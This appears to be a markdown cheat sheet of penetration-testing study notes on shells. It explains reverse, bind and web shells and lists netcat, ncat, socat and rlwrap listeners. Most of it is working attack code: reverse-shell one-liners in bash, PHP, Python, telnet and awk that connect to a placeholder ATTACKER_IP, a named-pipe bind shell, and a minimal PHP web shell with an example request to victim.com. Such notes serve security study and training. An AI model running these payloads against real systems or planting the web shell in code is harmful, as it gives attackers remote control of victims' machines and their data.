# Shells Overview

## What is a Shell?
A shell is software that allows a user to interact with an OS, commonly a command-line interface. In cybersecurity, it refers to a session used by attackers to remotely control a compromised system.

## Attackers Use Shells for:
- **Remote System Control**: Execute commands/software remotely.
- **Privilege Escalation**: Gain higher access.
- **Data Exfiltration**: Copy sensitive data.
- **Persistence**: Create backdoor access.
- **Post-Exploitation**: Deploy malware, hide accounts.
- **Pivoting**: Move through the network.

---

## **Reverse Shell**
A reverse shell connects from the target machine to the attacker's machine, bypassing firewalls.

### **How Reverse Shells Work**
1. **Set up a Netcat listener**  
   ```sh
   nc -lvnp 443
   ```
2. **Execute Reverse Shell Payload on Target**
   ```sh
   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
   ```

---

## **Bind Shell**
A bind shell opens a listening port on the target machine, allowing the attacker to connect.

### **Bind Shell Setup on Target**
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
### **Attacker Connects**
```sh
nc -nv TARGET_IP 8080
```

---

## **Alternative Shell Listeners**
- **Rlwrap**: Enhances Netcat interaction  
  ```sh
  rlwrap nc -lvnp 443
  ```
- **Ncat (Netcat Upgrade)**  
  ```sh
  ncat -lvnp 4444
  ```
  With SSL:  
  ```sh
  ncat --ssl -lvnp 4444
  ```
- **Socat**: Flexible socket utility  
  ```sh
  socat -d -d TCP-LISTEN:443 STDOUT
  ```

---

## **Common Reverse Shell Payloads**

### **Bash**
```sh
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### **PHP**
```php
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

### **Python**
```python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

### **Other Methods**
- **Telnet:**  
  ```sh
  TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
  ```
- **AWK:**  
  ```sh
  awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
  ```

---

## **Web Shells**
A web shell is a script that allows attackers to execute commands via a web server.

### **Simple PHP Web Shell**
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
**Usage Example:**  
Accessing the shell through the browser:  
```
http://victim.com/uploads/shell.php?cmd=whoami
```

### **Popular Web Shells**
- **p0wny-shell**: Minimal PHP shell.
- **b374k shell**: Feature-rich PHP shell.
- **c99 shell**: Robust PHP shell.

